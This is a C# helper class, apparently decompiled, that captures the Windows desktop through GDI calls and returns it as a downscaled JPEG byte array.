using System;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;

namespace Server.Helper;

internal static class ScreenCaptureHelper
{
	private const int DESKTOPVERTRES = 117;

	private const int DESKTOPHORZRES = 118;

	private const int LOGPIXELSX = 88;

	private static readonly ImageCodecInfo _jpegEncoder = ImageCodecInfo.GetImageEncoders().First((ImageCodecInfo c) => c.FormatID == ImageFormat.Jpeg.Guid);

	[DllImport("user32.dll")]
	private static extern IntPtr GetDesktopWindow();

	[DllImport("user32.dll")]
	private static extern IntPtr GetWindowDC(IntPtr hWnd);

	[DllImport("user32.dll")]
	private static extern int ReleaseDC(IntPtr hWnd, IntPtr hDc);

	[DllImport("gdi32.dll")]
	private static extern IntPtr CreateCompatibleDC(IntPtr hDc);

	[DllImport("gdi32.dll")]
	private static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);

	[DllImport("gdi32.dll")]
	private static extern IntPtr SelectObject(IntPtr hDc, IntPtr hObject);

	[DllImport("gdi32.dll")]
	private static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);

	[DllImport("gdi32.dll")]
	private static extern bool DeleteDC(IntPtr hdc);

	[DllImport("gdi32.dll")]
	private static extern bool DeleteObject(IntPtr hObject);

	[DllImport("user32.dll")]
	private static extern IntPtr GetDC(IntPtr hwnd);

	[DllImport("gdi32.dll")]
	private static extern int GetDeviceCaps(IntPtr hdc, int nIndex);

	private static float GetScalingFactor()
	{
		using Graphics g = Graphics.FromHwnd(IntPtr.Zero);
		float num = GetDeviceCaps(g.GetHdc(), 88);
		g.ReleaseHdc();
		return num / 96f;
	}

	public static byte[] CaptureDesktopJpeg(int quality = 80)
	{
		IntPtr dc = GetDC(IntPtr.Zero);
		float num = GetDeviceCaps(dc, 118);
		int h = GetDeviceCaps(dc, 117);
		ReleaseDC(IntPtr.Zero, dc);
		float scale = GetScalingFactor();
		int nWidth = (int)(num / scale);
		int nHeight = (int)((float)h / scale);
		IntPtr desktopWindow = GetDesktopWindow();
		IntPtr windowDC = GetWindowDC(desktopWindow);
		IntPtr intPtr = CreateCompatibleDC(windowDC);
		IntPtr bmp = CreateCompatibleBitmap(windowDC, nWidth, nHeight);
		IntPtr old = SelectObject(intPtr, bmp);
		BitBlt(intPtr, 0, 0, nWidth, nHeight, windowDC, 0, 0, 13369376);
		Bitmap bitmap = Image.FromHbitmap(bmp);
		SelectObject(intPtr, old);
		DeleteObject(bmp);
		DeleteDC(intPtr);
		ReleaseDC(desktopWindow, windowDC);
		byte[] result = BitmapToJpeg(bitmap, quality);
		bitmap.Dispose();
		return result;
	}

	private static byte[] BitmapToJpeg(Bitmap bitmap, int quality)
	{
		int halfW = bitmap.Width / 2;
		int halfH = bitmap.Height / 2;
		int w;
		int h;
		if (bitmap.Width > bitmap.Height)
		{
			w = halfW;
			h = (int)((float)bitmap.Height * ((float)halfW / (float)bitmap.Width));
		}
		else
		{
			w = (int)((float)bitmap.Width * ((float)halfH / (float)bitmap.Height));
			h = halfH;
		}
		using Bitmap scaled = new Bitmap(w, h);
		using Graphics g = Graphics.FromImage(scaled);
		g.InterpolationMode = InterpolationMode.Bilinear;
		g.SmoothingMode = SmoothingMode.HighSpeed;
		g.CompositingQuality = CompositingQuality.HighSpeed;
		g.DrawImage(bitmap, 0, 0, w, h);
		using MemoryStream ms = new MemoryStream();
		EncoderParameters encParams = new EncoderParameters(1);
		encParams.Param[0] = new EncoderParameter(Encoder.Quality, quality);
		scaled.Save(ms, _jpegEncoder, encParams);
		return ms.ToArray();
	}
}
